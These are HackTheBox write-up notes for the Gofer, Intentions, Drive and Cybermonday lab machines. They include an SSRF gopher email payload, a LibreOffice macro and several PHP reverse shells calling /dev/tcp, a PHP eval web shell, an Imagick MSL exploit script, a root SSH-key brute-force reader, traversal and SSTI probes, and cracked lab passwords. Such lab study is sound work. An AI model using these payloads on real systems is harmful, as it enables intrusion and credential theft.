## Gofer
[write-up](https://rouvin.gitbook.io/ibreakstuff/writeups/htb-season-2/gofer)
### Reco
- NMAP
    - `nmap -sVC 10.10.11.225`
        ![](https://hackmd.io/_uploads/SkEh6Mdi2.png)
        - 22 SSH
        - 25 filtered SMTP
        - 80 HTTP (redirect gofer.htb)
            - add it to our /etc/hosts
        - 139,445 SAMBA (smbd 4.6.2)
            - clock-skew -2s
            - security-mode 311 (signing enabled but not required)
- Website
    - "We are team of talented designers making websites with **BOOTSTRAP**"
        - BootstrapMade
    - images are stored in /assets/img/portfolio
    - contact form could have some weakness
        ![](https://hackmd.io/_uploads/B1wqpMdih.png)
### Weaponisation
- SMB
    - using nmap we found samba, lets scan it
        - `smbmap -H 10.10.11.225 -u " "`
            ![](https://hackmd.io/_uploads/r1R21Qdjn.png)
            - we have "read only" permissions to disk **SHARES**
    - let´s look inside shares disk
        - `smbclient -N //10.10.11.225/shares`
            ![](https://hackmd.io/_uploads/H1GPe7dsn.png)
    - analyze obtained backedup **email**
        - ![](https://hackmd.io/_uploads/HJCFlXusn.png)
            - email addresses: jdavis@gofer.htb, tbuckley@gofer.htb
            - they are sending important documents internally by mail
                - using .odt format (Libreoffice, not Office Word)
            - there is a proxy
- Dir scan
    - `dirsearch -u http://gofer.htb/`
        - we can access gofer.htb/assets
        ![](https://hackmd.io/_uploads/BJumDXOs2.png)
    - /assets
        - style.css, main.js
            - template Maxim v4.9.1
        - php-email-form/validate.js
            - PHP Email Form Validation v3.5
        ![](https://hackmd.io/_uploads/H1zvwm_oh.png)
- Proxy
    - let´s find the proxy
        - `ffuf -w /usr/share/wordlists/wfuzz/general/common.txt -u "http://gofer.htb" -H "Host: FUZZ.gofer.htb" -fw 20`
            - **proxy.gofer.htb** -> add it to /etc/hosts
                ![](https://hackmd.io/_uploads/H13NMXujn.png)
        
### Exploitation
- **SSRF**
    - when accessing proxy.gofer.htb, there is a login pop-up window
        - Lets try the POST request for the index.php 
            - `curl -X POST http://proxy.gofer.htb/index.php`
            ![](https://hackmd.io/_uploads/Sy35nT9sn.png)
                - passed without credentials, but nothing more...
        - there could be a SSRF vuln
            - URL parameter can be specified like this:
                - `curl -X POST http://proxy.gofer.htb/index.php?url=http://<LOCAL_IP>`
            - now we can try /passwd path
                - `curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd`
            - after a bit of testing and modifying...
                - `curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd`
- We need to use an .odt format to exploit this, and it appears that this is from the user Jeff Davis from the company site (with a username of jdavis, so we know the username naming convention). 
    - Since we have some kind of SSRF on the proxy service, we might be able to force a user to download and execute a malicious .odt file via macros to get the first shell. However, we first need to find out how to send an email through the proxy to the user since SMTP is not publicly facing. 
    - Based on the box name alone, I sort of figured out that we need to use the gopher:// protocol, which is used to send files to other users. 
- !!! **important knowledge**: [SSRF](https://infosecwriteups.com/server-side-request-forgery-to-internal-smtp-access-dea16fe37ed2?gi=50c9cd56d751) and [Gopherus payload](https://github.com/tarunkant/Gopherus) !!!
- OK: we want to use the **gopher** protocol to craft an ssrf payload based on the information in the email found on smb
    - right path to a foothold is in the obtained email
        - we can use the mentioned Gopherus for creating payload:
- **1. PAYLOAD:** 
    - `curl -X POST "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%250d%250aMAIL%20FROM%3A%3Ciamanidiot@gofer.htb%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%3Ciamanidiot@gofer.htb%3E%250d%250aTo%3A%20%3Cjdavis@gofer.htb%3E%250d%250a%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250a<a+href%3d'http%3a//10.10.14.24/macro.odt>open</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"`
        - [.odt file HINT](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
- **2. MACRO:**
    - prepare it by this [guide](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
                
> Sub Main
> Shell("bash -c 'bash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1'")
> End Sub

- **3. HTTP.SERVER && NC:**
    - `nc -nlvp <LOCAL_PORT>`
    - `python3 -m http.server 80` //in the folder containing macro.odt
### User flag
### Root flag
- Linpeas
    -  lim8en1 (option #8)
    -  23+who

# Cybermonday
## Reco
- `nmap -sVC 10.10.11.228`
    - add cybermonday.htb to /etc/hosts...
        - sudo nano /etc/hosts
- FUZZING
    - `wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 400,301 -H 'Host:cybermonday.htb/FUZZ' http://cybermonday.htb`
        - nothing found
    - `wfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hc 400,301 -H 'Host:FUZZ.cybermonday.htb' http://cybermonday.htb`
        - nothing found
    - `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://cybermonday.htb -t 100`
        - nothing found
- Website debugging
    - while checkning the website, it automatically opens the debig interface (probably checking if I try to cause SQL errors)...
        - 2 ways to cause this:
            - re-login with an existing user
            - change the user information in the profile
    ![](https://hackmd.io/_uploads/rk4NbE7ah.png)
    - on the left, there is a mention about existing **GIT**
        ![](https://hackmd.io/_uploads/ByzuW4ma3.png)
        - `cybermonday.htb/assets../.git/`
    - download the git using `git-dumper`
        - looking at the source code, there is an except:
            - `["_token","password","password_confirmation"]`
                - all parameters passed are saved by `$user->update($data);` then it saves information to the DB
    - from source code or debug on website we can see that the user´s model information looks like this:
        - {
            "id": 4,
            "username": "tester",
            "email": "test@gmail.com",
            "isAdmin": "false",
            "created_at": "2023-08-22T10:17:23.0000000Z",
            "updated_at": "2023-08-22T10:17:23.0000000Z",
        }


## Intentions
### Reco
1. nmap -> open ports 22 & 80 (SSH,HTTP)
2. Website -> login and register form
3. WFUZZ -> /admin /logout /css /js
4. Nikto -> nikto -host http://10.10.11.220/ -C all
    - nothing found
5. Explore /FUZZ subsites
    - `dirsearch -u http://intentions.htb`
    - http://10.10.11.220/js/admin.js
        ![](https://hackmd.io/_uploads/HJQabgeF2.png)
        - v2 API for admin section - PW is hashed using BCrypt
            - uploaded images are also hashed (imagick)
    - http://10.10.11.220/js/admin.js.licence.txt
        - running:
            |            |                     |               |
            | ---------- | ------------------- | ------------- |
            | bootstrap  | v5.2.3              | nothing found |
            | vue-router | v3.6.5              | nothing found |
            | vue.js     | v2.7.14             | nothing found |
            | lodash     | underscore.js 1.8.3 | nothing found |

6. Register && Login -> Gallery & Feed - images, we can specify our favourite genres
        -> available genres: animals, architecture, food, nature
8. Download images to test them for STEGO through: strings, binwalk, steghide, foremost, exiftool
        -> author names: ashlee w, dickens lin, jevgeni fil, kristin o karlsen etc...
        -> images are saved in path: /storage/<genre>/<name>
    - nothing found
### Weaponisation
1. Obtaining login credentials
    - SQLmap
        - We need two requests for sqlmap
            - First go to "Your Profile" and update "Favorite Genres" to get a request to /api/v1/gallery/user/genres. Use Burp's "Copy to File" and save it as "user-genres.req"
            - Second go to "Your Feed" and save the request to "/api/v1/gallery/user/feed" same as before as "user-feed.req"

After this we can use sqlmap to dump the database like so:
    
    sqlmap -r user-genres.req --second-req user-feed.req --batch --level=5 --risk=3 --tamper=space2comment -D intentions -T users -C admin,email,password --where "admin=1" --dump

| admin | email | password |
| -------- | -------- | -------- |
| 1     | steve@intentions.htb | `$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa` |
| 1     | greg@intentions.htb  | `$2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m` |

2. Testing hashes using Burpsuite
    - listen while logging into the page
    - send to repeater && modify request
        - add: v2 API, Content-Type, credentials...like this: 

```
POST /api/v2/auth/login HTTP/1.1
Host: intentions.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0=
Connection: close
Referer: http://intentions.htb/gallery
Cookie: XSRF-TOKEN=eyJpdiI6ImY5WlVxb005V29ZN05PMmMrcmpjc2c9PSIsInZhbHVlIjoiOXZnZEJ1ZVF0OUJtRzUyMU9VYWdPNCtPTXJKVzlJSEx1dElkZzJ2RU96OER4cGJiOFNvV0NGMWJIbWM3bU9ISmtrMXRQajJJdGJRd3BpM0MzYjI0Qk00eXNMc2lLU0VEV2o4UmlpSFUyc0RvVTFYejdqTHZMcDhVRzVvTThhd0EiLCJtYWMiOiI3MjM1NWQ2ZDViOGM2Y2ZjYzFjMTc0YzJlNTkzYWRhMGUxMDQyOGZiZWIzMDdkNGVkNGRhZTIzOWFiYjBhY2Y4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IkNzWHdLbEM2ZzZtOFBjcjlIUXQ0M1E9PSIsInZhbHVlIjoiVGxUYlVWc1FSTGtZZWdKZ2Y2QjhqNjNWZjVIZXhRd2tZVS9PR1dBcG0wOFI5RGI4TXhRb1paUmQ3T095MnNNdnFUd1IyeFNqcEFKLytyb0NnTm8veHNnaWFxT2VrcnZBcG9JbXl4Y1pndUF2cXRjMXd2aGVDYVUwbm8vWmVQWjYiLCJtYWMiOiI4MTgwYTk3ZmNhMjI3MzVkNDNlMGExNjUxNzIyNWY0MmJkZmNkOTRiYjI4NmViZTE5Y2U5MzEyOTg3YTNlN2UwIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YxL2F1dGgvbG9naW4iLCJpYXQiOjE2ODgzMzU1MjcsImV4cCI6MTY4ODM1NzEyNywibmJmIjoxNjg4MzM1NTI3LCJqdGkiOiJjeEdsQWZLRGtIT2xVcWVNIiwic3ViIjoiNDIiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.HG_JPZbeAyPgpwU2_sNv_i18r-BeaE9N0rkHTgfD6jk
Content-Length: 111
Content-Type: application/json

{"email":"steve@intentions.htb",
"hash":"$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa"}
```
- response for steve: ![](https://hackmd.io/_uploads/Hkw_8elK2.png)
- response for greg : ![](https://hackmd.io/_uploads/SJXBvxxYh.png)
- successfully logged in as steve/greg
    - we can access now:
        - /admin
        - /api/v2/admin/image/modify

### Exploit
- Exploiting logged-in user for www-data access using Arbitrary Object Instantiations in PHP
- website uses Imagick extension - here is the vuln
    - [guide here](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
    1. create the payload png: 
        - ```convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' lol.png```
    2. Start a http-server to serve the said png
        - ```python3 -m http.server 9001```
        - ```ifconfig``` -> get local tun IP
        - ```wget http://<local_ip>:9001/lol.png```
    3. Update needed parameters (local_url, target_url, admin_email, admin_hash) for the script and run it 
        - ```nc -nlvp <port>```
        - ```python3 exploit.py```
```
#!/usr/bin/env python3

import requests
import threading
import base64

local_url = "http://<local_ip:port>"
target_url = "http://<target_ip>"
admin_email = "<admin_email>"
admin_hash = "<admin_hash>"

login_url = target_url + "/api/v2/auth/login"
json = {"email":admin_email,"hash":admin_hash}
s = requests.session()
s.post(login_url, json=json)

msl_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="{local_url}/lol.png" />
<write filename="/var/www/html/intentions/public/lol.php" />
</image>'''

files = {"lol":("lol.msl", msl_file)}
def create_msl_on_temp():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, files=files)

json = {
    'path': 'vid:msl:/tmp/php*',
    'effect': 'lol'
}
def try_include():
    url = target_url + "/api/v2/admin/image/modify"
    s.post(url, json=json)

threads = []
for i in range(30):
	threads.append(threading.Thread(target=create_msl_on_temp))
	threads.append(threading.Thread(target=try_include))

for t in threads:
	t.start()
for t in threads:
	t.join()

while True:
	try:
		cmd = input("cmd> ")
		cmd = base64.b64encode(cmd.rstrip().encode()).decode()
		data = {
	    	"a":f"""system("echo {cmd} | base64 -d | bash");"""
		}
		payload_url = target_url + "/lol.php"
		r = requests.post(payload_url, data=data)
		print(r.text.split("Copyright")[1].encode().split(b"\n6\x11\xef\xbf")[0].decode())
	except KeyboardInterrupt:
		exit(0)
```
- we should be IN right now (like this)
    ![](https://hackmd.io/_uploads/H1IWsJ8Yh.png)
### User flag
We cannot move there, cannot write anything
- lets make another NC inside this NC
    - [another reverse shell](https://www.revshells.com/)
    - `python3 -c 'import pty; pty.spawn("/bin/bash")'`
For www-data to greg:
    - There is a git repo at 
        - /var/www/html/intentions/.git
    - Tar and download it
        - [git dumper](https://github.com/arthaud/git-dumper)

With ```git log``` we see this commit:
- commit f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4
    - Author: greg <greg@intentions.htb>
    - Date:   Thu Jan 26 09:21:52 2023 +0100
    - Test cases did not work on steve's local database, switching to user factory per his advice
    - Checking it with ```git show f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4```, we get creds for greg, which we can use for ssh...
    
### Root flag
For greg to root:

We see that greg is member of the scanner group, thus can run the /opt/scanner/scanner

This binary has ```cap_dac_read_search=ep``` capability so it can read any file.
```
greg@intentions:~$ getcap /opt/scanner/scanner 
/opt/scanner/scanner cap_dac_read_search=ep
```

Running it we get the help for it.
It hashes a file we provide with -c and compares it to the hash we provided with -s, also if we use the -p flag for the DEBUG, it gives us the hash of the file we provided.

```/opt/scanner/scanner -c /etc/passwd -s 5d41402abc4b2a76b9719d911017c592 -p```
[DEBUG] /etc/passwd has hash 0f1e356b6447c11283c68a0c6b904270

One interesting flag we can use is:
``` 
-l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
```

Which allows us to hash a file by starting with one byte and adding one byte at a time, thus allowing us to brute-force the contents of the file.

I also wrote a python script for it that allows us to read any file:
```python
#!/usr/bin/env python3

import hashlib
import os
import string

file_to_brute = "/root/.ssh/id_rsa"
charset = string.printable
current_read = ""

def find_char(temp_hash):
    for i in charset:
        test_data = current_read + i
        current_hash = hashlib.md5(test_data.encode()).hexdigest()
        if temp_hash == current_hash:
            return i
    return None

def get_hash(i):
    temp_hash = os.popen(f"/opt/scanner/scanner -c {file_to_brute} -s 5d41402abc4b2a76b9719d911017c592 -p -l {i}").read().split(" ")[-1].rstrip()
    return temp_hash

i = 1
while True:
    temp_hash = get_hash(i)
    new_char = find_char(temp_hash)
    if not new_char:
        break
    else:
        current_read += new_char
        i += 1
print(current_read)
```

Running it on the box we get the ssh key and login as root. 

## Drive
Find out how to read other files. FUZZ for valid entries where it gives unauthorized but files exists, etc. Then you will see how to actually read those files that exist. After that step foothold is right away. Then moving laterally to a different user. After shell, on the server you will find some zips of sqlite db backups - which will contain pwd hashes! You need to get into the gitea that is filtered (seen from nmap scan RIGHT??). Port fwd that once you have foothold obviously. In the gitea once logged you will see right away the archive password. Unzip and his is how you find sql hashes. Crack them. Be smart. Use tools appropriately. Check all backups since not every credential will work but you'll get the user. And done.
### Reco
nmap -sVC -Pn 10.10.11.235
    - 22 SSH -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
    - 80 HTTP -> redirect to http://drive.htb/
        - add to /etc/hosts
    - 3000 PPP -> filtered ppp

Dir busting
    - dirb http://drive.htb
    
+ http://drive.htb/contact (CODE:301|SIZE:0)                                                                             
+ http://drive.htb/favicon.ico (CODE:200|SIZE:2348)                                                                      
+ http://drive.htb/home (CODE:301|SIZE:0)                                                                                
+ http://drive.htb/login (CODE:301|SIZE:0)                                                                               
+ http://drive.htb/logout (CODE:301|SIZE:0)                                                                              
+ http://drive.htb/register (CODE:301|SIZE:0)                                                                            
+ http://drive.htb/reports (CODE:301|SIZE:0)                                                                             
+ http://drive.htb/subscribe (CODE:301|SIZE:0)                                                                           
+ http://drive.htb/upload (CODE:301|SIZE:0)                                                                              
+ http://drive.htb/upload_file (CODE:302|SIZE:0)                                                                         
+ http://drive.htb/upload_files (CODE:302|SIZE:0)                                                                        
+ http://drive.htb/uploaded (CODE:302|SIZE:0)                                                                            
+ http://drive.htb/uploadedfiles (CODE:302|SIZE:0)                                                                       
+ http://drive.htb/uploadedimages (CODE:302|SIZE:0)                                                                      
+ http://drive.htb/uploader (CODE:302|SIZE:0)                                                                            
+ http://drive.htb/uploadfile (CODE:302|SIZE:0)                                                                          
+ http://drive.htb/uploadfiles (CODE:302|SIZE:0)                                                                         
+ http://drive.htb/uploads (CODE:302|SIZE:0)  

### Enumeration
Website analysis
    - Doogle Drive
    - login, register, contact form...
    - register + login (Tester:testtest123)
        - Dashboard
            - File name, Owner, Group, Timestamp, Reserve
            - Group: toto -> unauthorized access
            - File SHELL: owner laurent
                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?> 
            - File FICHIER: owner laurent
                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?>
                - WE CAN EDIT IT
            - File KLMU: owner vince
                -  <html><script>var theCookies=document.cookie;document.write(theCookies);</script></html> 
            - File TEST: owner vince
                -  <html><script>var theCookies=document.cookie;document.write(theCookies);</script></html>
            - File REE: owner vince
                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?> 

### Weaponisation         
- create a file REVERSE to test NC shell
    - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/9443 0>&1'"); ?>
    - Reserved the file to my account (Tester)
    - http://drive.htb/130/getFileDetail/ => ID of my file is 130....we could change this ID to another to see file content we shouldnt :-)
        - when we clock on "Reserve", the URL changes:
            - before:   http://drive.htb/130/getFileDetail/
            - after:    http://drive.htb/130/block/
    - 114-119 are another uploaded files
        - we probably wanna get content of some other ID than our 130...
    - http://drive.htb/101/block/
        - BOOM, we found the backup file
            - database_backup_plan! 
            - owner: jamesMason
            - group: doodleGrive-development-team security-team 
        - hi team! me and my friend(Cris) created a new scheduled backup plan for the database, the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
            - *Note: the backup directory may change in the future!
            - *Note2: the backup would be protected with strong password! don't even think to crack it guys! :) 
        - What we obtained:
            - possible user:jamesMason, Cris
            - file PATH: /var/www/backups
            - no bruteforce PW needed
    - wfuzz -u "http://drive.htb/FUZZ/block/" -z range,0-200 -H "Cookie: csrftoken=UMdfwebTV1r30QkJpz5VwyEkj6sLm1hB; sessionid=hcbg92ofxnbv8oazvdrkrdssqnj322ox" --hc 404
        - CHANGE CSRFTOKEN AND SESSIONID WITH YOUR UNIQUE ONES (STORAGE:COOKIES)
        - http://drive.htb/79/block/
            - USER: martin
            - PW: Xk4@KjyrYv8t194L!
        - http://drive.htb/98/block/
            - USER: crisDisel
    - http://drive.htb/120/block/
        - "+str(True)+"
    - http://drive.htb/121/block/
        - {%_debug_%}     
    - http://drive.htb/122/block/
        - '+{% ssi /home/html/../../etc/passwd %}+' 
    - http://drive.htb/124/block/
        - ${{7*7}} 
    - http://drive.htb/125/block/    
        - ..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd 
    - http://drive.htb/126/block/    
        - %252e%252e%252e%252e%252e%252eetc/passwd  
    - http://drive.htb/127/block/    
        - %00nema 
    - http://drive.htb/128/block/    
        - ....//....//....//....//....//etc//passwd 
    - http://drive.htb/129/block/    
        - ;ls  

- SSH login to martin
    - ssh martin@10.10.11.235
        - PW: Xk4@KjyrYv8t194L!
        - /home -> cris, git, martin, tom
            - permission denied
        - /var/www/backups 
            - possible passwords for other accounts...
        - scp folder backups...
### User flag
- Obtain credentials from scp backup folder
    - 1_Nov_db_backup.sqlite3.7z
        - 4 passwords in SHA1
            - crack the SHA1 passwords...
                - tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
- Lateral Movement -> su na Toma
    - su tom
        - PW: johnmayer7
- cd /home/tom
- cat flag.txt

### Root flag

